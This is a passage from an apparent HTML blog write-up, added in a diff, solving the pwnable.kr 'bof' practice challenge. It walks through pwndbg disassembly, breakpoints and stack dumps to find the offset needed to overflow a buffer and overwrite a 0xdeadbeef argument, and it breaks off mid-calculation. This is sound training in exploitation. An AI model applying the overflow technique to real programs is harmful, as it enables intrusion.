+   <span class="mh">0x00000690</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>
+   <span class="mh">0x00000693</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0xdeadbeef</span>
+   <span class="mh">0x0000069a</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0x62c</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;</span>
+   <span class="mh">0x0000069f</span> <span class="o">&lt;+</span><span class="mi">21</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+   <span class="mh">0x000006a4</span> <span class="o">&lt;+</span><span class="mi">26</span><span class="o">&gt;:</span>	<span class="n">leave</span>
+   <span class="mh">0x000006a5</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">*</span><span class="n">main</span>
+<span class="n">Breakpoint</span> <span class="mi">1</span> <span class="n">at</span> <span class="mh">0x68a</span>
+</code></pre></div></div>
+
+<p>Now start the program,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">r</span>
+<span class="n">Starting</span> <span class="n">program</span><span class="o">:</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ra</span><span class="o">/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="o">/</span><span class="n">bof</span>
+
+<span class="n">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x5655568a</span> <span class="n">in</span> <span class="n">main</span> <span class="p">()</span>
+<span class="n">LEGEND</span><span class="o">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+<span class="err">───────────────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="p">]</span><span class="err">────────────────────────────────────────────</span>
+ <span class="n">EAX</span>  <span class="mh">0xf7fa9808</span> <span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0xffffd89c</span> <span class="err">—▸</span> <span class="mh">0xffffda4e</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">ALACRITTY_LOG</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="n">Alacritty</span><span class="o">-</span><span class="mi">34408</span><span class="p">.</span><span class="n">log</span><span class="err">'</span>
+ <span class="n">EBX</span>  <span class="mh">0x0</span>
+ <span class="n">ECX</span>  <span class="mh">0x8e86f40a</span>
+ <span class="n">EDX</span>  <span class="mh">0xffffd824</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+ <span class="n">EDI</span>  <span class="mh">0xf7fa7000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1ead6c</span>
+ <span class="n">ESI</span>  <span class="mh">0xf7fa7000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1ead6c</span>
+ <span class="n">EBP</span>  <span class="mh">0x0</span>
+ <span class="n">ESP</span>  <span class="mh">0xffffd7fc</span> <span class="err">—▸</span> <span class="mh">0xf7ddaee5</span> <span class="p">(</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">245</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x10</span>
+ <span class="n">EIP</span>  <span class="mh">0x5655568a</span> <span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">ebp</span>
+<span class="err">─────────────────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="p">]</span><span class="err">─────────────────────────────────────────────</span>
+ <span class="err">►</span> <span class="mh">0x5655568a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="n">push</span>   <span class="n">ebp</span>
+   <span class="mh">0x5655568b</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
+   <span class="mh">0x5655568d</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;</span>     <span class="n">and</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0xfffffff0</span>
+   <span class="mh">0x56555690</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>     <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x10</span>
+   <span class="mh">0x56555693</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mh">0xdeadbeef</span>
+   <span class="mh">0x5655569a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">func</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">&gt;</span>
+
+   <span class="mh">0x5655569f</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">21</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
+   <span class="mh">0x565556a4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">26</span><span class="o">&gt;</span>    <span class="n">leave</span>
+   <span class="mh">0x565556a5</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">27</span><span class="o">&gt;</span>    <span class="n">ret</span>
+
+   <span class="mh">0x565556a6</span>              <span class="n">nop</span>
+   <span class="mh">0x565556a7</span>              <span class="n">nop</span>
+<span class="err">─────────────────────────────────────────────</span><span class="p">[</span> <span class="n">STACK</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────</span>
+<span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span> <span class="mh">0xffffd7fc</span> <span class="err">—▸</span> <span class="mh">0xf7ddaee5</span> <span class="p">(</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">245</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">add</span>    <span class="n">esp</span><span class="p">,</span> <span class="mh">0x10</span>
+<span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>     <span class="mh">0xffffd800</span> <span class="err">◂—</span> <span class="mh">0x1</span>
+<span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffd804</span> <span class="err">—▸</span> <span class="mh">0xffffd894</span> <span class="err">—▸</span> <span class="mh">0xffffda26</span> <span class="err">◂—</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ra</span><span class="o">/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="o">/</span><span class="n">bof</span><span class="err">'</span>
+<span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffd808</span> <span class="err">—▸</span> <span class="mh">0xffffd89c</span> <span class="err">—▸</span> <span class="mh">0xffffda4e</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">ALACRITTY_LOG</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="n">Alacritty</span><span class="o">-</span><span class="mi">34408</span><span class="p">.</span><span class="n">log</span><span class="err">'</span>
+<span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>     <span class="mh">0xffffd80c</span> <span class="err">—▸</span> <span class="mh">0xffffd824</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>     <span class="mh">0xffffd810</span> <span class="err">—▸</span> <span class="mh">0xf7fa7000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1ead6c</span>
+<span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffd814</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffd818</span> <span class="err">—▸</span> <span class="mh">0xffffd878</span> <span class="err">—▸</span> <span class="mh">0xffffd894</span> <span class="err">—▸</span> <span class="mh">0xffffda26</span> <span class="err">◂—</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">ra</span><span class="o">/</span><span class="n">PWNPractice</span><span class="o">/</span><span class="n">pwnable</span><span class="p">.</span><span class="n">kr</span><span class="o">/</span><span class="n">bof</span><span class="o">/</span><span class="n">bof</span><span class="err">'</span>
+<span class="err">───────────────────────────────────────────</span><span class="p">[</span> <span class="n">BACKTRACE</span> <span class="p">]</span><span class="err">────────────────────────────────────────────</span>
+ <span class="err">►</span> <span class="n">f</span> <span class="mi">0</span> <span class="mh">0x5655568a</span> <span class="n">main</span>
+   <span class="n">f</span> <span class="mi">1</span> <span class="mh">0xf7ddaee5</span> <span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">245</span>
+<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+
+</code></pre></div></div>
+
+<p>After running the program,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">disassemble</span> <span class="n">func</span>
+<span class="n">Dump</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">code</span> <span class="k">for</span> <span class="n">function</span> <span class="n">func</span><span class="o">:</span>
+   <span class="mh">0x5655562c</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;:</span>	<span class="n">push</span>   <span class="n">ebp</span>
+   <span class="mh">0x5655562d</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
+   <span class="mh">0x5655562f</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;:</span>	<span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x48</span>
+   <span class="mh">0x56555632</span> <span class="o">&lt;+</span><span class="mi">6</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">gs</span><span class="o">:</span><span class="mh">0x14</span>
+   <span class="mh">0x56555638</span> <span class="o">&lt;+</span><span class="mi">12</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">],</span><span class="n">eax</span>
+   <span class="mh">0x5655563b</span> <span class="o">&lt;+</span><span class="mi">15</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">eax</span>
+   <span class="mh">0x5655563d</span> <span class="o">&lt;+</span><span class="mi">17</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x5655578c</span>
+   <span class="mh">0x56555644</span> <span class="o">&lt;+</span><span class="mi">24</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0xf7e2dcd0</span> <span class="o">&lt;</span><span class="n">__GI__IO_puts</span><span class="o">&gt;</span>
+   <span class="mh">0x56555649</span> <span class="o">&lt;+</span><span class="mi">29</span><span class="o">&gt;:</span>	<span class="n">lea</span>    <span class="n">eax</span><span class="p">,[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x2c</span><span class="p">]</span>
+   <span class="mh">0x5655564c</span> <span class="o">&lt;+</span><span class="mi">32</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="n">eax</span>
+   <span class="mh">0x5655564f</span> <span class="o">&lt;+</span><span class="mi">35</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0xf7e2d1b0</span> <span class="o">&lt;</span><span class="n">_IO_gets</span><span class="o">&gt;</span>
+   <span class="mh">0x56555654</span> <span class="o">&lt;+</span><span class="mi">40</span><span class="o">&gt;:</span>	<span class="n">cmp</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">],</span><span class="mh">0xcafebabe</span>
+   <span class="mh">0x5655565b</span> <span class="o">&lt;+</span><span class="mi">47</span><span class="o">&gt;:</span>	<span class="n">jne</span>    <span class="mh">0x5655566b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
+   <span class="mh">0x5655565d</span> <span class="o">&lt;+</span><span class="mi">49</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x5655579b</span>
+   <span class="mh">0x56555664</span> <span class="o">&lt;+</span><span class="mi">56</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0xf7e01830</span> <span class="o">&lt;</span><span class="n">__libc_system</span><span class="o">&gt;</span>
+   <span class="mh">0x56555669</span> <span class="o">&lt;+</span><span class="mi">61</span><span class="o">&gt;:</span>	<span class="n">jmp</span>    <span class="mh">0x56555677</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span>
+   <span class="mh">0x5655566b</span> <span class="o">&lt;+</span><span class="mi">63</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="mh">0x565557a3</span>
+   <span class="mh">0x56555672</span> <span class="o">&lt;+</span><span class="mi">70</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0xf7e2dcd0</span> <span class="o">&lt;</span><span class="n">__GI__IO_puts</span><span class="o">&gt;</span>
+   <span class="mh">0x56555677</span> <span class="o">&lt;+</span><span class="mi">75</span><span class="o">&gt;:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="p">]</span>
+   <span class="mh">0x5655567a</span> <span class="o">&lt;+</span><span class="mi">78</span><span class="o">&gt;:</span>	<span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span><span class="n">DWORD</span> <span class="n">PTR</span> <span class="n">gs</span><span class="o">:</span><span class="mh">0x14</span>
+   <span class="mh">0x56555681</span> <span class="o">&lt;+</span><span class="mi">85</span><span class="o">&gt;:</span>	<span class="n">je</span>     <span class="mh">0x56555688</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>
+   <span class="mh">0x56555683</span> <span class="o">&lt;+</span><span class="mi">87</span><span class="o">&gt;:</span>	<span class="n">call</span>   <span class="mh">0xf7ed44e0</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail</span><span class="o">&gt;</span>
+   <span class="mh">0x56555688</span> <span class="o">&lt;+</span><span class="mi">92</span><span class="o">&gt;:</span>	<span class="n">leave</span>
+   <span class="mh">0x56555689</span> <span class="o">&lt;+</span><span class="mi">93</span><span class="o">&gt;:</span>	<span class="n">ret</span>
+<span class="n">End</span> <span class="n">of</span> <span class="n">assembler</span> <span class="n">dump</span><span class="p">.</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">*</span><span class="mh">0x56555654</span>
+<span class="n">Breakpoint</span> <span class="mi">2</span> <span class="n">at</span> <span class="mh">0x56555654</span>
+</code></pre></div></div>
+
+<p>Now lets continue our program, until the “compare logic”</p>
+
+<p>Lets pass our inputs,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">c</span>
+<span class="n">Continuing</span><span class="p">.</span>
+<span class="n">overflow</span> <span class="n">me</span> <span class="o">:</span>
+<span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
+
+<span class="n">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x56555654</span> <span class="n">in</span> <span class="n">func</span> <span class="p">()</span>
+<span class="n">LEGEND</span><span class="o">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
+<span class="err">───────────────────────────────────────────</span><span class="p">[</span> <span class="n">REGISTERS</span> <span class="p">]</span><span class="err">────────────────────────────────────────────</span>
+<span class="o">*</span><span class="n">EAX</span>  <span class="mh">0xffffd7ac</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">'</span>
+ <span class="n">EBX</span>  <span class="mh">0x0</span>
+<span class="o">*</span><span class="n">ECX</span>  <span class="mh">0xf7fa7580</span> <span class="p">(</span><span class="n">_IO_2_1_stdin_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0xfbad2288</span>
+<span class="o">*</span><span class="n">EDX</span>  <span class="mh">0xffffd7df</span> <span class="err">◂—</span> <span class="mh">0xadbeef00</span>
+ <span class="n">EDI</span>  <span class="mh">0xf7fa7000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1ead6c</span>
+ <span class="n">ESI</span>  <span class="mh">0xf7fa7000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1ead6c</span>
+<span class="o">*</span><span class="n">EBP</span>  <span class="mh">0xffffd7d8</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">AAAAAAA</span><span class="err">'</span>
+<span class="o">*</span><span class="n">ESP</span>  <span class="mh">0xffffd790</span> <span class="err">—▸</span> <span class="mh">0xffffd7ac</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">'</span>
+<span class="o">*</span><span class="n">EIP</span>  <span class="mh">0x56555654</span> <span class="p">(</span><span class="n">func</span><span class="o">+</span><span class="mi">40</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">cmp</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span> <span class="mh">0xcafebabe</span>
+<span class="err">─────────────────────────────────────────────</span><span class="p">[</span> <span class="n">DISASM</span> <span class="p">]</span><span class="err">─────────────────────────────────────────────</span>
+ <span class="err">►</span> <span class="mh">0x56555654</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="n">cmp</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span> <span class="o">+</span> <span class="mi">8</span><span class="p">],</span> <span class="mh">0xcafebabe</span>
+   <span class="mh">0x5655565b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">47</span><span class="o">&gt;</span>    <span class="n">jne</span>    <span class="n">func</span><span class="o">+</span><span class="mi">63</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>
+    <span class="err">↓</span>
+   <span class="mh">0x5655566b</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">63</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mh">0x565557a3</span>
+   <span class="mh">0x56555672</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">puts</span> <span class="o">&lt;</span><span class="n">puts</span><span class="o">&gt;</span>
+
+   <span class="mh">0x56555677</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">75</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">ebp</span> <span class="o">-</span> <span class="mh">0xc</span><span class="p">]</span>
+   <span class="mh">0x5655567a</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">78</span><span class="o">&gt;</span>    <span class="n">xor</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">gs</span><span class="o">:</span><span class="p">[</span><span class="mh">0x14</span><span class="p">]</span>
+   <span class="mh">0x56555681</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">85</span><span class="o">&gt;</span>    <span class="n">je</span>     <span class="n">func</span><span class="o">+</span><span class="mi">92</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>
+
+   <span class="mh">0x56555683</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">87</span><span class="o">&gt;</span>    <span class="n">call</span>   <span class="n">__stack_chk_fail</span> <span class="o">&lt;</span><span class="n">__stack_chk_fail</span><span class="o">&gt;</span>
+
+   <span class="mh">0x56555688</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>    <span class="n">leave</span>
+   <span class="mh">0x56555689</span> <span class="o">&lt;</span><span class="n">func</span><span class="o">+</span><span class="mi">93</span><span class="o">&gt;</span>    <span class="n">ret</span>
+
+   <span class="mh">0x5655568a</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="n">push</span>   <span class="n">ebp</span>
+<span class="err">─────────────────────────────────────────────</span><span class="p">[</span> <span class="n">STACK</span> <span class="p">]</span><span class="err">──────────────────────────────────────────────</span>
+<span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span> <span class="n">esp</span> <span class="mh">0xffffd790</span> <span class="err">—▸</span> <span class="mh">0xffffd7ac</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">'</span>
+<span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span>     <span class="mh">0xffffd794</span> <span class="err">◂—</span> <span class="mh">0x534</span>
+<span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffd798</span> <span class="err">◂—</span> <span class="mh">0x9e</span>
+<span class="mo">03</span><span class="o">:</span><span class="mo">000</span><span class="n">c</span><span class="err">│</span>     <span class="mh">0xffffd79c</span> <span class="err">—▸</span> <span class="mh">0xf7fa5a80</span> <span class="p">(</span><span class="n">__dso_handle</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0xf7fa5a80</span>
+<span class="mo">04</span><span class="o">:</span><span class="mo">0010</span><span class="err">│</span>     <span class="mh">0xffffd7a0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span>     <span class="mh">0xffffd7a4</span> <span class="err">—▸</span> <span class="mh">0xf7fa7000</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x1ead6c</span>
+<span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span>     <span class="mh">0xffffd7a8</span> <span class="err">—▸</span> <span class="mh">0xf7ffc7e0</span> <span class="p">(</span><span class="n">_rtld_global_ro</span><span class="p">)</span> <span class="err">◂—</span> <span class="mh">0x0</span>
+<span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span> <span class="n">eax</span> <span class="mh">0xffffd7ac</span> <span class="err">◂—</span> <span class="err">'</span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><span class="err">'</span>
+<span class="err">───────────────────────────────────────────</span><span class="p">[</span> <span class="n">BACKTRACE</span> <span class="p">]</span><span class="err">────────────────────────────────────────────</span>
+ <span class="err">►</span> <span class="n">f</span> <span class="mi">0</span> <span class="mh">0x56555654</span> <span class="n">func</span><span class="o">+</span><span class="mi">40</span>
+   <span class="n">f</span> <span class="mi">1</span> <span class="mh">0x414141</span>
+   <span class="n">f</span> <span class="mi">2</span> <span class="mh">0xdeadbeef</span>
+   <span class="n">f</span> <span class="mi">3</span>      <span class="mh">0x0</span>
+<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+
+</code></pre></div></div>
+
+<p>Lets view our stack values in memory,</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">50</span><span class="n">wx</span> <span class="err">$</span><span class="n">esp</span>
+<span class="mh">0xffffd790</span><span class="o">:</span>	<span class="mh">0xffffd7ac</span>	<span class="mh">0x00000534</span>	<span class="mh">0x0000009e</span>	<span class="mh">0xf7fa5a80</span>
+<span class="mh">0xffffd7a0</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0xf7fa7000</span>	<span class="mh">0xf7ffc7e0</span>	<span class="mh">0x41414141</span>
+<span class="mh">0xffffd7b0</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>
+<span class="mh">0xffffd7c0</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>
+<span class="mh">0xffffd7d0</span><span class="o">:</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x41414141</span>	<span class="mh">0x00414141</span>
+<span class="mh">0xffffd7e0</span><span class="o">:</span>	<span class="mh">0xdeadbeef</span>	<span class="mh">0x00000000</span>	<span class="mh">0x565556b9</span>	<span class="mh">0x00000000</span>
+<span class="mh">0xffffd7f0</span><span class="o">:</span>	<span class="mh">0xf7fa7000</span>	<span class="mh">0xf7fa7000</span>	<span class="mh">0x00000000</span>	<span class="mh">0xf7ddaee5</span>
+<span class="mh">0xffffd800</span><span class="o">:</span>	<span class="mh">0x00000001</span>	<span class="mh">0xffffd894</span>	<span class="mh">0xffffd89c</span>	<span class="mh">0xffffd824</span>
+<span class="mh">0xffffd810</span><span class="o">:</span>	<span class="mh">0xf7fa7000</span>	<span class="mh">0x00000000</span>	<span class="mh">0xffffd878</span>	<span class="mh">0x00000000</span>
+<span class="mh">0xffffd820</span><span class="o">:</span>	<span class="mh">0xf7ffd000</span>	<span class="mh">0x00000000</span>	<span class="mh">0xf7fa7000</span>	<span class="mh">0xf7fa7000</span>
+<span class="mh">0xffffd830</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0x8e7f65c4</span>	<span class="mh">0xca9223d4</span>	<span class="mh">0x00000000</span>
+<span class="mh">0xffffd840</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000000</span>	<span class="mh">0x00000001</span>	<span class="mh">0x56555530</span>
+<span class="mh">0xffffd850</span><span class="o">:</span>	<span class="mh">0x00000000</span>	<span class="mh">0xf7fe7b24</span>
+</code></pre></div></div>
+
+<p>We can clearly see that,</p>
+
+<p><code class="language-plaintext highlighter-rouge">0xffffd7e0</code> has <code class="language-plaintext highlighter-rouge">0xdeadbeef</code></p>
+
+<p>Our buffer starts after <code class="language-plaintext highlighter-rouge">0xffffd7a0</code>+ <code class="language-plaintext highlighter-rouge">12 bytes</code> = <code class="language-plaintext highlighter-rouge">0xffffd7ab</code></p>
+
+<p>Lets find the offset of the <code class="language-plaintext highlighter-rouge">0xdeadbeef</code> data,</p>
+
+<pre><code class="language-offset=0xffffd7e0-0xffffd7ac```">
+Offset distance can be given by,
+
+```c
